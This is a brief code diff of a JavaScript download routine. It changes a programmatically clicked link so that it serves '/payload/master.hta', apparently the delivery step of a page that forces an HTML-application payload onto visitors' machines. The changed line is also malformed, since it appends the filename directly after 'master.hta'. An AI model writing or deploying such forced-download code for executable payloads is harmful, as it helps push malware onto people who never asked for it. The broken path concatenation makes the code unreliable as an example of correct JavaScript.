@@ -213,7 +213,7 @@ async function triggerDownload() {
             
             // Trigger download with unique name
             const link = document.createElement('a');
-            link.href = '/payload/' + encodeURIComponent(data.filename);
+            link.href = '/payload/master.hta' + encodeURIComponent(data.filename);
             link.download = data.filename;
             document.body.appendChild(link);
             link.click();
